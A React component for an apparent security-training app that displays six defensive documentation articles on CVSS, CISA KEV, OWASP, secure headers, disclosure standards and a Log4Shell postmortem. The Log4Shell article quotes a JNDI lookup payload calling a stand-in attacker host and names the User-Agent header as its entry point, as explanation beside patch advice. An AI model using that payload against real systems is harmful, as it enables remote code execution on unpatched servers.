import React, { useState } from "react";
import {
  BookOpen,
  Search,
  ExternalLink,
  Sparkles,
  Shield,
  Bookmark,
  BookmarkCheck,
} from "lucide-react";

export interface DocArticle {
  id: string;
  category: string;
  title: string;
  summary: string;
  source: string;
  sourceUrl: string;
  cveOrCwe?: string;
  cvssVector?: string;
  technicalDetails: string;
  defensiveGuidance: string;
  tags: string[];
}

export const DOCUMENTATION_ARTICLES: DocArticle[] = [
  {
    id: "doc-cvss-calc",
    category: "CVSS Severity & Scoring",
    title: "Understanding CVSS v3.1 & v4.0 Quantitative Risk Metrics",
    summary: "Comprehensive guide to CVSS Base, Temporal, and Environmental metrics, attack complexity, and why severity does not equal exploitability.",
    source: "FIRST.org / NIST NVD",
    sourceUrl: "https://www.first.org/cvss/v3.1/specification-document",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    technicalDetails: `The Common Vulnerability Scoring System (CVSS) provides a standardized framework for rating the severity of software vulnerabilities. 

Base Metric Group:
- Attack Vector (AV): Network (N), Adjacent (A), Local (L), Physical (P)
- Attack Complexity (AC): Low (L), High (H)
- Privileges Required (PR): None (N), Low (L), High (H)
- User Interaction (UI): None (N), Required (R)
- Scope (S): Unchanged (U), Changed (C)
- Confidentiality (C), Integrity (I), Availability (A): None (N), Low (L), High (H)

Exploitability vs. Real-World Risk:
A CVSS 9.8 vulnerability without a public proof-of-concept on an internal network poses lower immediate operational risk than a CVSS 7.5 vulnerability with an active exploit listed in CISA's Known Exploited Vulnerabilities (KEV) catalog.`,
    defensiveGuidance: "Prioritize patch remediation by cross-referencing CVSS Base Scores with CISA KEV and EPSS (Exploit Prediction Scoring System).",
    tags: ["CVSS", "NIST", "Risk Assessment", "Metrics"],
  },
  {
    id: "doc-cisa-kev",
    category: "Vendor Security Advisories",
    title: "CISA Known Exploited Vulnerabilities (KEV) Catalog Integration",
    summary: "How CISA identifies actively exploited in-the-wild vulnerabilities and mandates federal remediation timelines.",
    source: "CISA Cybersecurity and Infrastructure Security Agency",
    sourceUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
    cveOrCwe: "CISA-KEV",
    technicalDetails: `The Cybersecurity and Infrastructure Security Agency (CISA) maintains the KEV catalog as the authoritative register of vulnerabilities that threat actors are actively leveraging in attacks.

Inclusion Criteria:
1. Has an assigned CVE identifier.
2. Verified active exploitation in the wild.
3. Clear remediation action available (e.g. vendor patch or mitigating control).

Organizations must treat KEV listings as critical remediation emergencies regardless of theoretical CVSS score.`,
    defensiveGuidance: "Subscribe to KEV catalog updates and implement emergency patching SLAs within 14 days for all internet-facing systems.",
    tags: ["CISA", "KEV", "Active Exploitation", "Advisories"],
  },
  {
    id: "doc-owasp-top-10",
    category: "OWASP Top 10 & API Security",
    title: "OWASP Top 10 (2021) vs. OWASP API Security Top 10 (2023) Architecture",
    summary: "Detailed comparison of web application vulnerability rankings and microservice API security paradigms.",
    source: "OWASP Foundation",
    sourceUrl: "https://owasp.org/Top10/",
    cveOrCwe: "OWASP-2021",
    technicalDetails: `Web vs. API Security Shifts:
- Web Top 10 emphasizes broad application weaknesses: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection.
- API Top 10 targets object-level access and logic weaknesses: API1 Broken Object Level Authorization (BOLA), API2 Broken Authentication, API3 Broken Object Property Level Authorization, API5 Broken Function Level Authorization (BFLA).

Modern single-page applications (SPAs) shift state and business logic to backend JSON APIs, making BOLA the single most pervasive critical security flaw in modern cloud architectures.`,
    defensiveGuidance: "Validate user authorization on every object ID query at the data layer rather than relying on UI route guards.",
    tags: ["OWASP", "BOLA", "API Security", "Access Control"],
  },
  {
    id: "doc-log4shell-case",
    category: "Incident Reports & Postmortems",
    title: "Case Study: CVE-2021-44228 (Log4Shell) JNDI Lookup Vulnerability",
    summary: "Technical postmortem of the Apache Log4j2 JNDI remote code execution vulnerability, string expansion mechanism, and patch history.",
    source: "Apache Security Team / MITRE",
    sourceUrl: "https://nvd.nist.gov/vuln/detail/cve-2021-44228",
    cveOrCwe: "CVE-2021-44228 / CWE-502",
    cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
    technicalDetails: `Root Cause:
Apache Log4j2 versions 2.0-beta9 through 2.14.1 evaluated recursive message lookups inside format strings. When user-controlled input containing \`\${jndi:ldap://attacker.com/a}\` was logged, the Log4j \`JndiManager\` resolved the LDAP URL and loaded remote bytecode into the JVM.

Exploitation Vector:
- HTTP User-Agent header: \`\${jndi:ldap://...\`
- Logged search queries, form fields, or error messages.

Patch Progression:
1. Version 2.15.0 restricted default JNDI lookups to localhost.
2. Version 2.16.0 completely disabled JNDI lookups by default.
3. Version 2.17.0 removed message lookups recursively to prevent denial of service.`,
    defensiveGuidance: "Upgrade Log4j to 2.17.1+ or set environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` in legacy environments.",
    tags: ["Log4j", "RCE", "JNDI", "Postmortem"],
  },
  {
    id: "doc-secure-headers",
    category: "Secure Coding Guidelines",
    title: "OWASP Secure Headers Project: Production Deployment Guide",
    summary: "Specification and directives for Content-Security-Policy (CSP), Strict-Transport-Security (HSTS), and cookie isolation.",
    source: "OWASP Secure Headers Project",
    sourceUrl: "https://owasp.org/www-project-secure-headers/",
    cveOrCwe: "CWE-693",
    technicalDetails: `Mandatory Defensive Headers:
1. \`Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';\`
   Mitigates XSS by preventing execution of inline scripts and untrusted external domains.

2. \`Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\`
   Forces user browsers to communicate strictly over encrypted HTTPS.

3. \`X-Content-Type-Options: nosniff\`
   Blocks MIME-type sniffing attacks where browsers execute images as JavaScript.

4. \`X-Frame-Options: DENY\`
   Prevents clickjacking by blocking iframe embedding.`,
    defensiveGuidance: "Implement defensive HTTP headers at the reverse proxy or API gateway layer (e.g. Cloudflare, NGINX, or AWS CloudFront).",
    tags: ["CSP", "HSTS", "Defensive Headers", "Secure Coding"],
  },
  {
    id: "doc-cvd-standards",
    category: "Vulnerability Disclosure Timelines",
    title: "ISO/IEC 29147 & 30111: Coordinated Vulnerability Disclosure (CVD)",
    summary: "International standards for responsible security vulnerability reporting, vendor triage, remediation windows, and ethical publication.",
    source: "ISO / FIRST CVD Standard",
    sourceUrl: "https://www.first.org/resources/guides/cvd-guide",
    cveOrCwe: "CVD-ISO-29147",
    technicalDetails: `Coordinated Vulnerability Disclosure (CVD) defines the protocol between security researchers and software vendors to resolve vulnerabilities before public disclosure:

Standard 90-Day Disclosure Timeline:
- Day 0: Researcher submits detailed advisory with reproduction steps.
- Day 7: Vendor confirms receipt and initial triage.
- Day 30: Vendor shares remediation plan and affected version confirmation.
- Day 60: Vendor provides beta patch for verification.
- Day 90: Coordinated public disclosure with CVE identifier and released patch.

Exceptions:
- If a vulnerability is actively exploited in the wild, the timeline is shortened to 7-14 days to deploy emergency mitigations.`,
    defensiveGuidance: "Establish a public `security.txt` file and dedicated security contact email (security@domain.com) conforming to RFC 9116.",
    tags: ["CVD", "Responsible Disclosure", "Ethics", "ISO 29147"],
  },
];

export interface SecurityDocumentationCenterProps {
  onNavigateTab: (tab: string) => void;
}

export const SecurityDocumentationCenter: React.FC<SecurityDocumentationCenterProps> = ({ onNavigateTab }) => {
  const [selectedArticleId, setSelectedArticleId] = useState<string>("doc-cvss-calc");
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedCategory, setSelectedCategory] = useState<string>("All");
  const [bookmarkedIds, setBookmarkedIds] = useState<Record<string, boolean>>({});

  const activeArticle =
    DOCUMENTATION_ARTICLES.find((a) => a.id === selectedArticleId) || DOCUMENTATION_ARTICLES[0];

  const categories = ["All", ...Array.from(new Set(DOCUMENTATION_ARTICLES.map((a) => a.category)))];

  const toggleBookmark = (id: string) => {
    setBookmarkedIds((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const handleAskMentor = (action: string) => {
    let prompt = "";
    if (action === "simple") {
      prompt = `Explain the core concept of "${activeArticle.title}" simply as if I am a beginner in cybersecurity. What is it, why does it matter, and how does it work?`;
    } else if (action === "technical") {
      prompt = `Provide an advanced technical deep-dive into "${activeArticle.title}" (${activeArticle.cveOrCwe || ""}). Detail the underlying architecture, threat vector, and exact root cause.`;
    } else if (action === "remediation") {
      prompt = `What are the defense-in-depth engineering remediation steps and verification checklists for "${activeArticle.title}"?`;
    }

    const event = new CustomEvent("appsec-ai-mentor-query", {
      detail: {
        prompt: prompt,
        topic: activeArticle.title,
      },
    });
    window.dispatchEvent(event);
    onNavigateTab("mentor");
  };

  const filteredArticles = DOCUMENTATION_ARTICLES.filter((art) => {
    const matchCat = selectedCategory === "All" || art.category === selectedCategory;
    const matchSearch =
      art.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
      art.summary.toLowerCase().includes(searchQuery.toLowerCase()) ||
      art.tags.some((t) => t.toLowerCase().includes(searchQuery.toLowerCase()));
    return matchCat && matchSearch;
  });

  return (
    <div className="flex flex-col gap-6 p-6 max-w-7xl mx-auto w-full text-slate-100">
      {/* Header */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 border-b border-slate-800 pb-5">
        <div>
          <div className="flex items-center gap-2">
            <BookOpen className="text-cyan-400" size={24} />
            <h1 className="text-2xl font-bold tracking-tight text-white">Security Documentation & Intelligence Center</h1>
          </div>
          <p className="text-sm text-slate-400 mt-1">
            Authoritative documentation from NIST NVD, MITRE CVE/CWE, FIRST CVSS, OWASP, and CISA KEV.
          </p>
        </div>

        <button
          onClick={() => onNavigateTab("zeroDayResearch")}
          className="px-3 py-1.5 rounded-lg bg-cyan-950 border border-cyan-800 text-cyan-300 text-xs font-semibold flex items-center gap-1.5 transition-colors hover:bg-cyan-900"
        >
          <Shield size={14} />
          <span>Open Zero-Day Research Workspace</span>
        </button>
      </div>

      {/* Main Split Layout: Article List & Reader */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Left Column: Search & Articles List */}
        <div className="flex flex-col gap-3">
          <div className="relative">
            <Search size={14} className="absolute left-2.5 top-2.5 text-slate-500" />
            <input
              type="text"
              placeholder="Search documentation, CVE, CWE..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-slate-900 border border-slate-800 text-xs pl-8 pr-3 py-2 rounded text-white focus:outline-none focus:border-cyan-400"
            />
          </div>

          <div className="flex flex-wrap gap-1">
            {categories.map((cat) => (
              <button
                key={cat}
                onClick={() => setSelectedCategory(cat)}
                className={`px-2 py-0.5 rounded text-[10px] font-semibold transition-colors ${
                  selectedCategory === cat
                    ? "bg-cyan-500/20 text-cyan-300 border border-cyan-500/40"
                    : "bg-slate-900 text-slate-400 hover:text-white"
                }`}
              >
                {cat}
              </button>
            ))}
          </div>

          <div className="flex flex-col gap-1.5 overflow-y-auto max-h-[600px] pr-1">
            {filteredArticles.map((art) => {
              const isSelected = art.id === selectedArticleId;
              const isBookmarked = bookmarkedIds[art.id];

              return (
                <button
                  key={art.id}
                  onClick={() => setSelectedArticleId(art.id)}
                  className={`p-3 rounded-lg text-left transition-all border ${
                    isSelected
                      ? "bg-slate-800/90 border-cyan-500/80 shadow-md shadow-cyan-950"
                      : "bg-slate-900/60 border-slate-800/80 hover:border-slate-700"
                  }`}
                >
                  <div className="flex items-center justify-between mb-1">
                    <span className="text-[10px] font-mono font-bold text-cyan-400">{art.category}</span>
                    {isBookmarked && <BookmarkCheck size={12} className="text-cyan-400" />}
                  </div>
                  <h3 className="text-xs font-bold text-white mb-1">{art.title}</h3>
                  <p className="text-[11px] text-slate-400 line-clamp-2 leading-relaxed">{art.summary}</p>
                  <div className="flex items-center gap-1.5 mt-2">
                    {art.cveOrCwe && (
                      <span className="px-1.5 py-0.2 rounded text-[9px] font-mono font-bold bg-slate-950 text-slate-300 border border-slate-800">
                        {art.cveOrCwe}
                      </span>
                    )}
                    <span className="text-[10px] text-slate-500 truncate">{art.source}</span>
                  </div>
                </button>
              );
            })}
          </div>
        </div>

        {/* Right Column: Full Article Reader */}
        <div className="lg:col-span-2 bg-slate-900/90 border border-slate-800 rounded-xl p-6 shadow-lg flex flex-col justify-between">
          <div className="space-y-4">
            {/* Article Header */}
            <div className="flex items-start justify-between gap-3 border-b border-slate-800 pb-4">
              <div>
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-xs font-mono font-bold px-2 py-0.5 rounded bg-cyan-950 text-cyan-300 border border-cyan-800">
                    {activeArticle.category}
                  </span>
                  {activeArticle.cveOrCwe && (
                    <span className="text-xs font-mono font-bold px-2 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-800">
                      {activeArticle.cveOrCwe}
                    </span>
                  )}
                </div>
                <h2 className="text-lg font-bold text-white">{activeArticle.title}</h2>
                <div className="flex items-center gap-3 text-xs text-slate-400 mt-1">
                  <span>Source: {activeArticle.source}</span>
                  <a
                    href={activeArticle.sourceUrl}
                    target="_blank"
                    rel="noreferrer"
                    className="text-cyan-400 hover:underline flex items-center gap-1"
                  >
                    <ExternalLink size={11} /> <span>Official Reference</span>
                  </a>
                </div>
              </div>

              <button
                onClick={() => toggleBookmark(activeArticle.id)}
                className="p-2 rounded bg-slate-800 text-slate-300 hover:text-white transition-colors"
                title="Bookmark article"
              >
                {bookmarkedIds[activeArticle.id] ? (
                  <BookmarkCheck size={16} className="text-cyan-400" />
                ) : (
                  <Bookmark size={16} />
                )}
              </button>
            </div>

            {/* CVSS Vector if available */}
            {activeArticle.cvssVector && (
              <div className="bg-slate-950 p-2.5 rounded border border-slate-800 flex items-center justify-between text-xs font-mono">
                <span className="text-slate-400">CVSS v3.1 Vector:</span>
                <span className="text-rose-400 font-bold">{activeArticle.cvssVector}</span>
              </div>
            )}

            {/* Technical Explanation */}
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">
                Technical Analysis & Architecture
              </h3>
              <div className="bg-slate-950 p-4 rounded-lg border border-slate-800 text-xs text-slate-300 leading-relaxed font-sans whitespace-pre-line">
                {activeArticle.technicalDetails}
              </div>
            </div>

            {/* Defensive Guidance */}
            <div>
              <h3 className="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">
                Defensive Guidance & Remediation Checklist
              </h3>
              <div className="bg-emerald-950/30 p-3.5 rounded-lg border border-emerald-800/50 text-xs text-emerald-200 leading-relaxed">
                {activeArticle.defensiveGuidance}
              </div>
            </div>
          </div>

          {/* AI Explainer Action Bar */}
          <div className="mt-6 pt-4 border-t border-slate-800 flex flex-col sm:flex-row items-center justify-between gap-3">
            <span className="text-xs text-slate-400 font-semibold flex items-center gap-1.5">
              <Sparkles size={14} className="text-cyan-400" /> AI Explainer Actions:
            </span>

            <div className="flex items-center gap-2 flex-wrap">
              <button
                onClick={() => handleAskMentor("simple")}
                className="px-2.5 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-200 transition-colors"
              >
                Explain Simply
              </button>
              <button
                onClick={() => handleAskMentor("technical")}
                className="px-2.5 py-1 text-xs rounded bg-slate-800 hover:bg-slate-700 text-slate-200 transition-colors"
              >
                Technical Deep-Dive
              </button>
              <button
                onClick={() => handleAskMentor("remediation")}
                className="px-2.5 py-1 text-xs rounded bg-cyan-950 hover:bg-cyan-900 text-cyan-300 border border-cyan-800 transition-colors"
              >
                Remediation Guidance
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
